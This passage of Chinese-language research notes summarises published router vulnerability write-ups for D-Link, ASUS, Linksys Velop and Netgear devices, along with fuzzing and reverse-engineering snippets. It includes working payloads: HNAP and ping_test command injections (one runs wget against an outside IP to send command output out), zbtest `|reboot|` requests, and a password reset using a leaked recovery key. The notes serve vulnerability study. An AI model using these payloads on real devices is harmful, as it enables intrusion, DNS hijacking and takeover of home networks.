<li>应该是可以，但是wget时：2020-05-26 18:06:20 (97.8 KB/s) - 在 8804 字节处连接关闭。重试中。（尽管如此，也能下载下来，打开搜索passwd，能找到wan0_pppoe_passwd=123456</li>
</ul>
</li>
</ul>
<h2 id="D-Link路由器HNAP协议系列漏洞披露"><a href="#D-Link路由器HNAP协议系列漏洞披露" class="headerlink" title="D-Link路由器HNAP协议系列漏洞披露"></a>D-Link路由器HNAP协议系列漏洞披露</h2><p><a href="https://www.heibai.org/post/1395.html" target="_blank" rel="noopener">https://www.heibai.org/post/1395.html</a></p>
<ul>
<li>结合DNS Rebinding技术，实现了穿透攻击处于内网的路由器</li>
<li>HNAP协议（Home Network Administration Protocol），普遍应用于智能家居、SOHO办公等中小型网络中，在路由器上应用广泛，D-Link设备也广泛使用了HNAP协议</li>
<li>通过逆向分析和动态调试澄清路由器对HNAP协议的实现架构和处理流程<ul>
<li>其中DIR-823G在goahead完整实现了全部功能，</li>
<li>DIR-878在lighttpd中通过调用librcm.so、rc模块实现</li>
</ul>
</li>
<li>综合使用二进制静态分析和动态Fuzzing技术<ul>
<li>其中DIR-823G没有开启对HNAP API的访问认证，导致大量敏感API暴露，越权问题普遍存在，更严重的是数个API函数使用中存在命令注入</li>
<li>DIR-878虽然开启了HNAP API访问认证，但是API函数普遍存在命令注入问题</li>
</ul>
</li>
<li>结合DNS Rebinding的漏洞危害效果评估<ul>
<li>由于路由器通常应用在局域网中，在以往的攻防对抗中，其安全漏洞的攻击面很难直接暴露在公网上，</li>
<li>因此，攻击者越来越多的通过钓鱼植入等方式诱导内网用户下载执行攻击代码，从而从内部控制路由器，</li>
<li>反向连接到公网上的攻击者服务器，实现穿透攻击。</li>
<li>其中DNS Rebinding技术即可以很好的达到这种打入局域网内部的攻击效果</li>
</ul>
</li>
<li>DNS Rebinding技术演示<ul>
<li>攻击者可通过发送内嵌恶意代码的网页URL链接给WLAN网内用户，网页中恶意代码将多次请求攻击者的远程DNS服务器解析主机名，触发DNS Rebinding，重定向攻击控制网关路由器。由此实现，只需要一个URL链接即可</li>
<li>Step1：攻击者发送恶意URL链接</li>
<li>Step2：受害者点击链接，受害者浏览恶意网页，网页JS代码攻击篡改路由器上的DNS服务配置；</li>
<li>Step3：内网其他主机用户访问重要网站（例如login.taobao.com）被劫持</li>
</ul>
</li>
<li>攻击原理解析：<ul>
<li>攻击者发送恶意URL链接 </li>
<li>受害者点击该链接，此时DNS server 将主机名解析为攻击者的web服务器IP；</li>
<li>网页中视频播放一分钟左右，JS脚本会POST请求<a href="http://dnsrebind.smilehacker.net/HNAP1/；" target="_blank" rel="noopener">http://dnsrebind.smilehacker.net/HNAP1/；</a></li>
<li>此时DNS server将响应客户端的第二次对dnsrebind.smilehacker.net的解析请求，返回地址为路由器网关IP192.168.0.1, 漏洞攻击数据包将送达到路由器, 攻击成功，且不会触发浏览器跨域限制；</li>
<li>视频中的攻击载荷修改了路由器的DNS服务配置，将淘宝登陆域名login.taobao.com指向了攻击者的仿冒网站，达到了DNS劫持的目的。</li>
</ul>
</li>
<li>上述攻击中，两次DNS请求的间隔时间取决于浏览器中DNS记录缓存刷新时间，只要在这个攻击潜伏的窗口期内，用户没有关闭浏览器，即可攻击成功！为了尽可能缩小这个时间窗口期，在攻击者控制的DNS server中设置DNS记录的生命周期 TTL值为0，并挑选常见的个人用户主机浏览器配置结合下载执行的攻击负载，进行攻击窗口期测试（迷迷糊糊</li>
<li>越权访问类型漏洞（CVE-2019-7388~7390，CVE-2019-8392）<ul>
<li>此类漏洞存在于DIR-823G中</li>
<li>发现接入WLAN的用户无需认证可以远程调用上述API接口函数</li>
<li>所以，攻击者通过调用其中的一些敏感函数如GetClientInfo、SetWanSettings、SetFactoryDefault、SetWLanRadioSettings，能够达到信息窃取、DNS劫持、重置出厂设置、开启Guest Wi-Fi等越权访问类漏洞攻击</li>
<li>CVE-2019-7390：越权修改DNS配置，实现DNS劫持</li>
<li>通过调用HNAP接口的SetWanSettings函数，可以直接修改DNS设置</li>
</ul>
</li>
<li>命令注入类型漏洞<ul>
<li>在两款路由器中均存在，</li>
<li>多处HNAP功能函数在调用系统shell执行相关命令时，没有严格过滤外部输入参数，导致命令注入漏洞</li>
<li>漏洞位于DIR-823G的/bin/goahead，str变量在给system函数执行之前：ping str2 -c %d -w %d -s %d &gt; /tmp/ping.txt 2&gt;&gt;/tmp/ping.txt，其中的str2来自域名字段</li>
<li>利用方法：需要先调用HNAP接口SetNetworkTomographySettings设置对应的域名字段，然后调用GetNetworkTomographyResult触发漏洞</li>
<li>通过发送POST请求，调用HNAP协议的SOAP接口SetNetworkTomographySettings（通过在Headers中包含对应的SOAPAction字段指明对应的方法名称:</li>
<li>将分隔符和ps命令直接写入到address字段，即<address>;ps</address></li>
<li>通过发送POST请求来远程调用API接口GetNetworkTomographyResult，请求和返回如下，得到ps命令执行的回显，验证该漏洞利用成功</li>
</ul>
</li>
<li><p>修补建议主要分为两个方面：</p>
<ul>
<li>开启HNAP接口的登陆认证，尤其需要保护针对敏感功能函数的远程使用；</li>
<li>HNAP协议在管理设备时，需要经常调用系统shell执行命令，在使用外部输入作为命令输入参数时，可以通过黑名单的方式过滤掉参数中存在的当前设备支持的shell命令。</li>
</ul>
</li>
<li><p>近年在物联网的迅速兴起下，网络设备的低成本、功能快速迭代需求导致厂商往往更加无暇顾及安全问题</p>
</li>
<li>（前面讲危害，后面讲原理</li>
</ul>
<h2 id="华硕路由器9999端口远程命令执行研究报告-V1"><a href="#华硕路由器9999端口远程命令执行研究报告-V1" class="headerlink" title="华硕路由器9999端口远程命令执行研究报告 V1"></a>华硕路由器9999端口远程命令执行研究报告 V1</h2><p><a href="https://blog.knownsec.com/2015/01/report-of-asua-router-9999-port-remote-command-execution-v1/" target="_blank" rel="noopener">https://blog.knownsec.com/2015/01/report-of-asua-router-9999-port-remote-command-execution-v1/</a></p>
<ul>
<li>华硕路由器R系列路由器使用开源路由器系统Asuswrt，开源代码给我们随后的漏洞分析带来很多方便，不用逆向分析。</li>
<li>在Asuswrt中存在infosvr进程，<ul>
<li>该进程监听在0.0.0.0 IP上，监听本机任何IP的9999 UDP端口。</li>
<li>Infosvr自身的授权机制不完整，在infosvr处理用户提交的数据时也没有适合的过滤，</li>
<li>而且使用了system()函数执行部分请求，最终导致远程命令执行漏洞。</li>
</ul>
</li>
<li>分析流程<ul>
<li>processPacket()函数把请求数据转换成IBOX_COMM_PKT_HDR结构，想触发漏洞，需要按照这个数据结构来发送数据包</li>
<li>想要触发漏洞，需要通过if，所以设定攻击代码的前两字节分别为xxx</li>
<li>MAC验证是摆设，<code>if(memecpy(phdr_ex-&gt;macaddress,mac,6)==0)</code>，把MacAddress的前6字节拷贝到了字符数组mac处，返回是指向mac地址的指针，不会等于0</li>
<li>（大胆猜测作者可能是想用memcmp()函数，结果用错了</li>
</ul>
</li>
<li>路由器系统管理端口正常情况下是不会暴漏在公网上的，我们检索到的只是暴漏在公网上开放管理端口路由器设备的，相信还有更多的设备隐藏在背后</li>
</ul>
<h2 id="分析多款D-Link路由器中的未授权RCE漏洞"><a href="#分析多款D-Link路由器中的未授权RCE漏洞" class="headerlink" title="分析多款D-Link路由器中的未授权RCE漏洞"></a>分析多款D-Link路由器中的未授权RCE漏洞</h2><p><a href="https://www.anquanke.com/post/id/187923" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187923</a></p>
<ul>
<li><p>产品已超出产品支持生命周期（EOL），这意味着厂商不会再为我们发现的问题提供补丁</p>
</li>
<li><p>没有采用正确的身份认证流程，也是漏洞利用的基础</p>
</li>
<li><p>路由器管理页面，尝试登录</p>
<ul>
<li>action=do_graph_auth</li>
<li>URI为：/apply_sec.cgi</li>
</ul>
</li>
<li><p><strong>不管登录与否，程序将一直执行下去，不会终止</strong></p>
<ul>
<li>默认情况下，current_user没有被初始化，user_username的值为user</li>
<li>因此二者的比较结果iVar2不等于0，程序就不会因为返回<code>error.asp</code>而终止</li>
</ul>
</li>
<li><p>query_vars一般是能够执行成功的</p>
<ul>
<li>然后进入if条件分支，将URI值与/apply_sec.cgi作比较。</li>
<li>如果满足条件，则ppcVar3指向SSC_SEC_OBJS数组</li>
<li>（前面处理登录操作的就是apply_sec.cgi，因此也满足条件，因此指向sec数组</li>
<li>ppcVar3指向的是SSC_SEC_OBJS数组，该数组包含一系列action值，有一个为：ping_test</li>
</ul>
</li>
<li><p><strong>错误的身份认证：即使没通过认证，代码仍会继续执行，这意味着我们可以通过/apply_sec.cgi路径，执行SSC_SEC_OBJS中的任意action操作</strong></p>
</li>
<li><p>action为ping_test时，从ping_ipaddr参数中提取输入值，执行ping操作。</p>
<ul>
<li>如果尝试输入特殊字符（比如双引号、单引号、分号等），ping操作会执行失败。</li>
<li><p>幸运的是，如果我们传入换行符（比如8.8.8.8%0als），就可以实现命令注入攻击效果。</p>
</li>
<li><p>action=ping_test&amp;ping_ipaddr=127.0.0.1%0awget%20-P%20/tmp/%20<a href="http://45.76.148.31:4321/?$" target="_blank" rel="noopener">http://45.76.148.31:4321/?$</a>(echo 1234)</p>
</li>
<li>向apply_sec.cgi发起POST HTTP请求，执行的action为ping_test，然后通过ping_ipaddr参数实现命令注入。</li>
<li>虽然路由器返回的是登录页面，但ping_test操作实际上已经成功执行</li>
</ul>
</li>
<li><p>该漏洞的根源在于设备没有对原生系统所执行的命令进行检查，这也是许多固件厂商经常存在的一种安全隐患</p>
</li>
</ul>
<h2 id="IoT-设备网络协议模糊测试工具boofuzz实战"><a href="#IoT-设备网络协议模糊测试工具boofuzz实战" class="headerlink" title="IoT 设备网络协议模糊测试工具boofuzz实战"></a>IoT 设备网络协议模糊测试工具boofuzz实战</h2><p><a href="https://blog.csdn.net/song_lee/article/details/104334096" target="_blank" rel="noopener">https://blog.csdn.net/song_lee/article/details/104334096</a></p>
<p>类似：<a href="https://cq674350529.github.io/2019/03/31/IoT设备固件分析之网络协议fuzz/" target="_blank" rel="noopener">https://cq674350529.github.io/2019/03/31/IoT设备固件分析之网络协议fuzz/</a></p>
<ul>
<li>/opt/firmware-analysis-toolkit$ ./fat.py ~/Desktop/firmware/RB-1732_TC_v2.0.43.bin</li>
<li>burp抓包</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">POST /goform/formLogin HTTP/1.1</span><br><span class="line">Host: 192.168.156.214:8000</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://192.168.156.214:8000/admin.asp</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 39</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">username=admin&amp;password=123&amp;login=Login</span><br></pre></td></tr></table></figure>
<ul>
<li>根据报文，利用boofuzz框架提供的原语对http请求进行定义：<a href="https://boofuzz.readthedocs.io/en/stable/user/static-protocol-definition.html#primitive-definition" target="_blank" rel="noopener">https://boofuzz.readthedocs.io/en/stable/user/static-protocol-definition.html#primitive-definition</a></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s_initialize(name=<span class="string">"Request"</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># http请求行</span></span><br><span class="line"><span class="keyword">with</span> s_block(<span class="string">"Request-Line"</span>): </span><br><span class="line">  <span class="comment"># LINE 1: POST /goform/formLogin HTTP/1.1</span></span><br><span class="line">  s_static(<span class="string">"POST"</span>, name=<span class="string">"Method"</span>)	<span class="comment"># Push a static value</span></span><br><span class="line">  s_delim(<span class="string">" "</span>, name=<span class="string">'space-1'</span>)</span><br><span class="line">  s_string(<span class="string">"/fromLogin"</span>, name=<span class="string">'Request-URI'</span>)  <span class="comment"># 需要变异</span></span><br><span class="line">  s_delim(<span class="string">" "</span>, name=<span class="string">'space-2'</span>)</span><br><span class="line">  s_static(<span class="string">'HTTP/1.1'</span>, name=<span class="string">'HTTP-Version'</span>)   </span><br><span class="line">  s_static(<span class="string">"\r\n"</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># LINE 2</span></span><br><span class="line">  s_static(<span class="string">"Host"</span>, name=<span class="string">"Host"</span>)</span><br><span class="line">  s_static(<span class="string">": "</span>)</span><br><span class="line">  s_static(<span class="string">"192.168.10.1"</span>, name=<span class="string">"ip"</span>)</span><br><span class="line">  s_static(<span class="string">"\r\n"</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># LINE 3  对应 Content-Length: 400</span></span><br><span class="line">  s_static(<span class="string">'Content-Length'</span>)</span><br><span class="line">  s_static(<span class="string">': '</span>)</span><br><span class="line">  s_size(<span class="string">'data'</span>, output_format=<span class="string">'ascii'</span>, fuzzable=<span class="keyword">True</span>)    <span class="comment"># size的值根据data部分的长度自动进行计算，同时对该字段进行fuzz</span></span><br><span class="line">  s_static(<span class="string">'\r\n'</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># ...</span></span><br><span class="line">	s_static(<span class="string">'\r\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># http请求数据</span></span><br><span class="line"><span class="keyword">with</span> s_block(<span class="string">'data'</span>):</span><br><span class="line">  s_static(<span class="string">'login_name=&amp;curTime=1581845487827&amp;setLang=&amp;setNoAutoLang=&amp;login_n=admin&amp;login_pass='</span>)</span><br><span class="line">  s_string(<span class="string">'123456'</span>, max_len=<span class="number">1024</span>)	<span class="comment"># 需要变异，且最大长度为1024</span></span><br><span class="line">  s_static(<span class="string">'&amp;languageSel=1'</span>)</span><br></pre></td></tr></table></figure>
<h2 id="Linksys-velop-authentication-bypass"><a href="#Linksys-velop-authentication-bypass" class="headerlink" title="Linksys velop authentication bypass"></a>Linksys velop authentication bypass</h2><p><a href="https://puzzor.github.io/Linksys-Velop-Authentication-bypass" target="_blank" rel="noopener">https://puzzor.github.io/Linksys-Velop-Authentication-bypass</a></p>
<ol>
<li>velop是家庭Wi-Fi系统，WHW03型号，WHW0303/02/01仅表示这一套有几个，其实是一样的东西</li>
<li>这是WHW03，而实机是WHW01</li>
<li>信息泄漏、认证绕过（改密码</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 泄漏敏感信息</span></span><br><span class="line">GET /sysinfo_json.cgi HTTP/1.1</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line"><span class="string">"wps_pin"</span>: <span class="string">"wps_device_pin = 58163597"</span>,<span class="comment"># 只要wps功能开启，就可通过此pin来连接Wi-Fi，而不需要知道密码</span></span><br><span class="line"><span class="string">"device_recovery_key"</span>: <span class="string">"84667"</span>,<span class="comment"># 可用来重置密码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###############################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改登录密码</span></span><br><span class="line">POST /JNAP/ HTTP/1.1</span><br><span class="line">X-JNAP-Action: http://linksys.com/jnap/nodes/setup/SetAdminPassword</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">"resetCode"</span>:<span class="string">"84667"</span>,<span class="string">"adminPassword"</span>:<span class="string">"test1234"</span>&#125;<span class="comment"># 用上述获得的84667</span></span><br></pre></td></tr></table></figure>
<h2 id="Linksys-velop-zbtest-command-injection"><a href="#Linksys-velop-zbtest-command-injection" class="headerlink" title="Linksys velop zbtest command injection"></a>Linksys velop zbtest command injection</h2><p><a href="https://puzzor.github.io/Linksys-Velop-zbtest-command-injection" target="_blank" rel="noopener">https://puzzor.github.io/Linksys-Velop-zbtest-command-injection</a></p>
<ol>
<li>/cgi-bin/zbtest.cgi，lua脚本</li>
</ol>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 1 可传递三个参数</span></span><br><span class="line">cmd = params[<span class="string">"cmd"</span>]</span><br><span class="line">node_id = params[<span class="string">"nodeid"</span>]</span><br><span class="line">level = params[<span class="string">"level"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2 cmd=remove、on、off时，没有检查node_id，扔进remove_bulbs、ShellExecute执行命令</span></span><br><span class="line"><span class="keyword">elseif</span> cmd == <span class="string">"remove"</span> <span class="keyword">and</span> node_id <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">"Run remove command : "</span>..node_id..<span class="string">"&lt;br&gt;&lt;br&gt;"</span>)</span><br><span class="line">  remove_bulbs(node_id)</span><br><span class="line"><span class="keyword">elseif</span> cmd == <span class="string">"on"</span> <span class="keyword">and</span> node_id <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">"Run turn on command : "</span>..node_id..<span class="string">"&lt;br&gt;&lt;br&gt;"</span>)</span><br><span class="line">  ShellExecute(<span class="string">"zbapitest on-off "</span>..node_id..<span class="string">" 1 &gt; "</span>..name..<span class="string">" 2&gt;&amp;1"</span>)</span><br><span class="line"><span class="keyword">elseif</span> cmd == <span class="string">"off"</span> <span class="keyword">and</span> node_id <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">"Run turn off command : "</span>..node_id..<span class="string">"&lt;br&gt;&lt;br&gt;"</span>)</span><br><span class="line">  ShellExecute(<span class="string">"zbapitest on-off "</span>..node_id..<span class="string">" 0 &gt; "</span>..name..<span class="string">" 2&gt;&amp;1"</span>)</span><br><span class="line"><span class="comment">-- 3 cmd=level时，没有检查level和node_id，扔进ShellExecute执行命令</span></span><br><span class="line"><span class="keyword">elseif</span> cmd == <span class="string">"level"</span> <span class="keyword">and</span> level <span class="keyword">and</span> node_id <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">"Run level ("</span>..level..<span class="string">") command : "</span>..node_id..<span class="string">"&lt;br&gt;&lt;br&gt;"</span>)</span><br><span class="line">  ShellExecute(<span class="string">"zbapitest level "</span>..node_id..<span class="string">" "</span>..level..<span class="string">" 0 1"</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>poc</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line">GET /cgi-bin/zbtest.cgi?cmd=off&amp;nodeid=|reboot| HTTP/1.1</span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line">GET /cgi-bin/zbtest.cgi?cmd=level&amp;nodeid=0x0&amp;level=1|reboot| HTTP/1.1</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>命令执行函数：system、popen、ShellExecute</li>
</ol>
<h2 id="Linksys-velop-information-leak"><a href="#Linksys-velop-information-leak" class="headerlink" title="Linksys velop information leak"></a>Linksys velop information leak</h2><p><a href="https://puzzor.github.io/Linksys-Velop-Information-Leak" target="_blank" rel="noopener">https://puzzor.github.io/Linksys-Velop-Information-Leak</a></p>
<ol>
<li>厂商并未修改，仍然存在（当时，现在未知</li>
<li>Linksys APP会通过JNAP协议与路由器通信，诸多功能通过 X-JNAP-Action请求头来指定</li>
<li>有的JNAP action可以不经过认证</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">POST /JNAP/ HTTP/1.1<span class="comment"># 请求/JNAP</span></span><br><span class="line">User-Agent: Linksys/2.5.2 (iPhone; iOS 11.2.6; Scale/3.00)<span class="comment"># 表明是app端</span></span><br><span class="line">X-JNAP-Action: http://linksys.com/jnap/devicelist/GetDevices<span class="comment"># 指定action，一般对应lua文件</span></span><br><span class="line"></span><br><span class="line">&#123;&#125;<span class="comment"># 指定action所需的参数</span></span><br></pre></td></tr></table></figure>
<ol start="4">
<li>app端的请求，应该用pc端也可以，再者可以通过ua头来伪造</li>
<li>挖洞思路：指定action一般是”<a href="http://linksys.com/jnap/xxxxxx&quot;形式，/JNAP/module目录中搜索字符串，找到所有支持的action，依次看哪个不需要认证，并进一步审计lua文件（比如参数有几个，是否经过过滤，如上述popen和ShellExcue导致的命令注入" target="_blank" rel="noopener">http://linksys.com/jnap/xxxxxx&quot;形式，/JNAP/module目录中搜索字符串，找到所有支持的action，依次看哪个不需要认证，并进一步审计lua文件（比如参数有几个，是否经过过滤，如上述popen和ShellExcue导致的命令注入</a></li>
</ol>
<h2 id="Pwn2Own-Netgear-R6700-UPnP漏洞分析"><a href="#Pwn2Own-Netgear-R6700-UPnP漏洞分析" class="headerlink" title="Pwn2Own Netgear R6700 UPnP漏洞分析"></a>Pwn2Own Netgear R6700 UPnP漏洞分析</h2><p><a href="https://cq674350529.github.io/2020/07/04/Pwn2Own-Netgear-R6700-UPnP漏洞分析/" target="_blank" rel="noopener">https://cq674350529.github.io/2020/07/04/Pwn2Own-Netgear-R6700-UPnP漏洞分析/</a></p>
<ul>
<li>sscanf、sprintf均可溢出，前者分发后者整合</li>
<li>upnpd二进制文件默认侦听多个端口：5000/tcp、56938/udp和1900/udp。最后两个端口监听0.0.0.0，而第一个端口只监听路由器的LAN地址。</li>
<li>根据字符串判定函数名、处于函数开头作日志功能</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sub_BAC8功能类似print_debugs</span></span><br><span class="line">sub_BAC8(2, <span class="string">"%s()\n"</span>, <span class="string">"sa_method_check"</span>);</span><br><span class="line">sub_BAC8(3, <span class="string">"%s(%d);\n"</span>, <span class="string">"sa_setBlockName"</span>, 1069);</span><br><span class="line">sub_BAC8(2, <span class="string">"%s(): type = %d\n"</span>, <span class="string">"sa_processResponse"</span>, a1);</span><br></pre></td></tr></table></figure>
<ul>
<li>poc中uri：soap/server_sa</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># uri为soap/server_sa或者soap/server_sa/opendns才会进入sa_method_check</span></span><br><span class="line">int __fastcall upnp_handle_post(int http_uri, const char *http_content, int a3, int *a4, int a5)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( stristr(http_uri, <span class="string">"soap/server_sa"</span>) || stristr(http_uri, <span class="string">"soap/server_sa/opendns"</span>) )</span><br><span class="line">    <span class="built_in">return</span> sa_method_check(http_content, a3, a4, a5);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确定第一个参数为uri，第二个为content</span></span><br><span class="line">ssize_t __fastcall upnp_parse_request(const char *a1, int a2, int *a3, int a4)</span><br><span class="line">&#123;</span><br><span class="line">  strncpy((char *)http_content, http_content_2, 0x3FFu);</span><br><span class="line">  http_data = (char *)http_content;</span><br><span class="line">  http_header = strsep(&amp;http_data, <span class="string">"\r\n"</span>);<span class="comment"># 分割字符串，左边给返回值，右边给参数1</span></span><br><span class="line">  http_method = strsep(&amp;http_header, <span class="string">" \t"</span>);</span><br><span class="line">  http_uri = strsep(&amp;http_header, <span class="string">" \t"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stricmp(http_method, <span class="string">"POST"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( upnp_handle_post((int)http_uri, http_content_2, a2, a3, a4) )</span><br></pre></td></tr></table></figure>
<ul>
<li>参考：<a href="https://github.com/pedrib/PoC/blob/da317bbb22abc2c88c8fcad0668cdb94b2ba0a6f/advisories/Pwn2Own/Tokyo_2019/tokyo_drift/tokyo_drift.md" target="_blank" rel="noopener">https://github.com/pedrib/PoC/blob/da317bbb22abc2c88c8fcad0668cdb94b2ba0a6f/advisories/Pwn2Own/Tokyo_2019/tokyo_drift/tokyo_drift.md</a></li>
</ul>
<h2 id="Hacking-the-D-Link-DIR-890L"><a href="#Hacking-the-D-Link-DIR-890L" class="headerlink" title="Hacking the D-Link DIR-890L"></a>Hacking the D-Link DIR-890L</h2><p><a href="http://www.devttys0.com/2015/04/hacking-the-d-link-dir-890l/" target="_blank" rel="noopener">http://www.devttys0.com/2015/04/hacking-the-d-link-dir-890l/</a></p>
<ul>
<li><p>固件：<a href="http://legacyfiles.us.dlink.com/" target="_blank" rel="noopener">http://legacyfiles.us.dlink.com/</a></p>
</li>
<li><p>识别main</p>
</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sub_97F4即main</span></span><br><span class="line">int start()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">return</span> ((int (__fastcall *)(int (*)()))_uClibc_main)(sub_97F4);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># rename后自动，恰好3参数</span></span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br></pre></td></tr></table></figure>
<ul>
<li>判定函数名</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 通过调用者函数中的字符串对比</span></span><br><span class="line">  <span class="keyword">if</span> ( !strcmp(s1a, <span class="string">"conntrack.cgi"</span>) )</span><br><span class="line">    <span class="built_in">return</span> contrack_main(argc, argv, envp);</span><br><span class="line">  <span class="keyword">if</span> ( !strcmp(s1a, <span class="string">"hnap"</span>) )</span><br><span class="line">    <span class="built_in">return</span> hnap_main(argc, (int)argv, (int)envp);</span><br><span class="line">  <span class="keyword">if</span> ( !strcmp(s1a, <span class="string">"fwupload.cgi"</span>) )</span><br><span class="line">    <span class="built_in">return</span> fwupload_main(argc, argv, envp);</span><br></pre></td></tr></table></figure>
<ul>
<li>字符串check时，strstr有风险，不如strcmp，前者包含关系，后者等于关系</li>
<li>strstr、strchr可用于截取字符串</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># r表示反向，如下为GetDeviceSettings</span></span><br><span class="line">soapaction = <span class="string">"http://purenetworks.com/HNAP1/GetDeviceSettings"</span>;</span><br><span class="line">soapaction = strrchr(soapaction, <span class="string">'/'</span>);</span><br></pre></td></tr></table></figure>
<h2 id="IoT设备漏洞复现到固件后门植入"><a href="#IoT设备漏洞复现到固件后门植入" class="headerlink" title="IoT设备漏洞复现到固件后门植入"></a>IoT设备漏洞复现到固件后门植入</h2><p><a href="https://www.anquanke.com/post/id/232845" target="_blank" rel="noopener">https://www.anquanke.com/post/id/232845</a></p>
<ul>
<li>main中，依据不同uri调用不同函数</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uri = *argv;</span><br><span class="line">  v6 = <span class="built_in">strrchr</span>(*argv, <span class="string">'/'</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">    uri = v6 + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  v29 = <span class="built_in">strcmp</span>(uri, <span class="string">"gena.cgi"</span>);</span><br><span class="line">  func_envp = envp;</span><br><span class="line">  <span class="keyword">if</span> ( !v29 )</span><br><span class="line">  &#123;</span><br><span class="line">    func_name = genacgi_main;<span class="comment">// 间接调用，交叉引用，o类型而非p</span></span><br><span class="line">    func_argc = argc;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))func_name)(func_argc, argv, func_envp);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>进程通信：cgibin中拼接后交由php文件处理、格式化字符串中开头即通信的php文件</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">handle_method_subscribe</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *service)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 按照文中，应该是第二处字符串拼接处，有pid</span></span><br><span class="line">  pid = getpid();</span><br><span class="line">  <span class="built_in">snprintf</span>(                                     <span class="comment">// 字符串拼接，构造各种全局变量（php中用</span></span><br><span class="line">                                                <span class="comment">// INF_UID、SHELL_FILE变量可控</span></span><br><span class="line">    v23,</span><br><span class="line">    <span class="number">0x200</span>u,</span><br><span class="line">    <span class="string">"%s\nMETHOD=SUBSCRIBE\nINF_UID=%s\nSERVICE=%s\nHOST=%s\nURI=/%s\nTIMEOUT=%d\nREMOTE=%s\nSHELL_FILE=%s/%s_%d.sh"</span>,</span><br><span class="line">    <span class="string">"/htdocs/upnp/run.NOTIFY.php"</span>,              <span class="comment">// 通信的php文件</span></span><br><span class="line">    server_id,</span><br><span class="line">    service,                                    <span class="comment">// inf_uid</span></span><br><span class="line">    v13 + <span class="number">7</span>,                                    <span class="comment">// host</span></span><br><span class="line">    v16 + <span class="number">1</span>,                                    <span class="comment">// uri</span></span><br><span class="line">    timeout,</span><br><span class="line">    remote_addr,</span><br><span class="line">    <span class="string">"/var/run"</span>,                                 <span class="comment">// shell_file来自如下3 </span></span><br><span class="line">    service,</span><br><span class="line">    pid);</span><br><span class="line">  xmldbc_ephp(<span class="number">0</span>, <span class="number">0</span>, v23, (<span class="keyword">int</span>)<span class="built_in">stdout</span>);          <span class="comment">// 进程通信:通过socket发送，交由php文件处理</span></span><br></pre></td></tr></table></figure>
<ul>
<li>更新固件两种方法<ul>
<li>web端，cat /var/passwd获取密码</li>
<li>telnet进入shell，固件更新脚本usr/sbin/fw_upgrade</li>
<li>（实质上，web端更新也是调用的脚本，前者自动，后者手动</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>漏洞分析</tag>
        <tag>栈溢出</tag>
        <tag>摄像头</tag>
